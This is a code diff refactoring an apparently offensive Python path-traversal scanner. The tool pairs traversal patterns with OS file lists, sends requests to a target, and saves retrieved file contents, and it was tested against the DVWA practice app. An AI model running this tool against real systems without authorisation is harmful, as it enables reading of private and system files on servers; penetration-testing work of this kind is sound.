@@ -68,7 +68,7 @@ KNOWN DIRTRAS BUGS:
 --- 1 ---
 /proc/self/cwd/index.php 
 Was removed from linux_files.txt because it crashed DVWA during test.
-Feel free to add it back but if you get HTTPConnectionPool Read timed out. error than that might be it.
+Feel free to add it back but if you get HTTPConnectionPool Read timed out error than that might be it.
 
 --- 2 ---
 
@@ -170,6 +170,14 @@ def is_downloadable(u):
         return False
 
     return True
+
+
+def get_request(s, u, c=None):
+    if not c:
+        return s.get(u)
+
+    else:
+        return s.get(u, cookies=c)  # Sends request with cookie
 
 
 try:
@@ -333,17 +341,17 @@ with open(file, "r") as traverse_file, open(f"{OS}_files.txt", "r") as interest_
     session = requests.session()
 
     # Read files to remove the need to change the pointer
-    traverse_file_list = traverse_file.readlines()
-    interest_dirs_list = interest_dirs.readlines()
+    list_of_traversal_techniques = traverse_file.readlines()
+    list_of_directories = interest_dirs.readlines()
 
     # Gets the number of files that are supposed to be retrieved
-    files_to_get = len(interest_dirs_list)
+    files_to_get = len(list_of_directories)
 
     # Counts number of files found
     file_counter = 0
 
     # Calculates number of iterations for user
-    num_of_iterations = len(traverse_file_list) * len(interest_dirs_list)
+    num_of_iterations = len(list_of_traversal_techniques) * len(list_of_directories)
 
     # By using a traversal directory that is going to fail
     # we can find the byte length of what a failed traversal would be
@@ -352,13 +360,8 @@ with open(file, "r") as traverse_file, open(f"{OS}_files.txt", "r") as interest_
     fail_url = url + fail_traversal  # Creates the url to fail
 
     try:
-        # No cookies
-        if not cookie:
-            failed_traversal = session.get(fail_url)
 
-        # With cookies
-        else:
-            failed_traversal = session.get(fail_url, cookies=session_cookie)  # Sends request with cookie
+        failed_traversal = get_request(session, fail_url, session_cookie)
 
     except Exception as error:
         sys.exit(f"Failed To Get Failed Traversal Content For Comparison | {error}")
@@ -367,30 +370,33 @@ with open(file, "r") as traverse_file, open(f"{OS}_files.txt", "r") as interest_
     failed_traversal_content_len = len(failed_traversal.content)
 
     # Iterate through different traversal techniques
-    for traverse in traverse_file_list:
+    for traversal_technique in list_of_traversal_techniques:
 
         # Iterate through os relevant directories
-        for os_dir in interest_dirs_list:
+        for directory_to_try in list_of_directories:
 
             # Delay and count here isntead of at the end of every if statement
             time.sleep(delay)
             iter_count += 1
-            # Removes / start from the directory so it isn't duplicated
-            if os_dir[:1] in ("/", "\\"):
-                os_dir = os_dir[1:]
-            # Creates the traversal directory/interest file and removes trailing \n
-            directory_os_dir = fr"{traverse}"[:-1].replace("{FILE}",
-                                                           fr"{os_dir}"[:-1]).replace("{FILE", fr"{os_dir}"[:-1])
 
-            parsed_url = urlparse(url)  # Create urllib parse object
-            proto_hostname = f"{parsed_url.scheme}://{parsed_url.netloc}/"  # Scheme + Hostname
+            # Removes / start from the directory so it isn't duplicated
+            if directory_to_try[:1] in ("/", "\\"):
+                directory_to_try = directory_to_try[1:]
+
+            # Creates the traversal directory/interest file and removes trailing \n
+            directory_os_dir = fr"{traversal_technique}"[:-1]\
+                .replace("{FILE}", fr"{directory_to_try}"[:-1]).replace("{FILE", fr"{directory_to_try}"[:-1])
+
+            # Create urllib parse object
+            parsed_url = urlparse(url)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"  # Scheme + Hostname
 
             # Creates url with traversel/directory
 
-            url_directory_built = f"{url[len(proto_hostname):]}{directory_os_dir}"
+            url_directory_built = f"{url[len(base_url):]}{directory_os_dir}"
 
             # Creates final url
-            built_url = f"{url[:len(proto_hostname) - 1]}:{port}/{url_directory_built}"
+            built_url = f"{url[:len(base_url) - 1]}:{port}/{url_directory_built}"
 
             # Attempt to send request and handle exception
             try:
@@ -398,7 +404,8 @@ with open(file, "r") as traverse_file, open(f"{OS}_files.txt", "r") as interest_
                     dir_traversal_target = session.get(built_url, timeout=3)
 
                 else:
-                    dir_traversal_target = session.get(built_url, cookies=session_cookie, timeout=3)  # Sends request with cookie
+                    # Sends request with cookie
+                    dir_traversal_target = session.get(built_url, cookies=session_cookie, timeout=3)
 
             except Exception as error:
                 session = requests.session()
@@ -463,33 +470,34 @@ with open(file, "r") as traverse_file, open(f"{OS}_files.txt", "r") as interest_
             # Save content to html folder with specific name / formatting
             else:
 
-                # If the content is empty continue
+                # If the returned content is empty continue
                 if len(dir_traversal_target.content) == 0:
                     continue
 
                 # If the content has already been found, skip
-                if os_dir in html_found_list:
+                if directory_to_try in html_found_list:
                     continue
 
-                html_found_list.append(os_dir)
+                html_found_list.append(directory_to_try)  # Append the file that has been found
 
                 #  Creates filename depending on target OS
                 if OS == "windows":
-                    os_dir_file = os_dir.split(r"\\")[-1].rstrip("\n").replace(".", "_").replace("\\", "_")
+                    os_dir_file = directory_to_try.split(r"\\")[-1].rstrip("\n").replace(".", "_").replace("\\", "_")
+
                 else:
-                    os_dir_file = os_dir.rstrip("\n").replace(".", "_").replace("/", "_")
+                    os_dir_file = directory_to_try.rstrip("\n").replace(".", "_").replace("/", "_")
 
                 # Create directory filenames for specific host operating system
-                windows_directory_filename = fr"{output}\\html\\{os_dir_file}_content_{iter_count}.html"
-                linux_directory_filename = f"{output}/html/{os_dir_file}_content_{iter_count}.html"
+                win_dir_filename = fr"{output}\\html\\{os_dir_file}_content_{iter_count}.html"
+                linux_dir_filename = f"{output}/html/{os_dir_file}_content_{iter_count}.html"
 
                 try:
                     if host_sys == "windows":
-                        open(windows_directory_filename, "wb").write(dir_traversal_target.content)
+                        open(win_dir_filename, "wb").write(dir_traversal_target.content)
                         file_counter += 1
 
                     else:
-                        open(linux_directory_filename, "wb").write(dir_traversal_target.content)
+                        open(linux_dir_filename, "wb").write(dir_traversal_target.content)
                         file_counter += 1
 
                 except OSError as error:
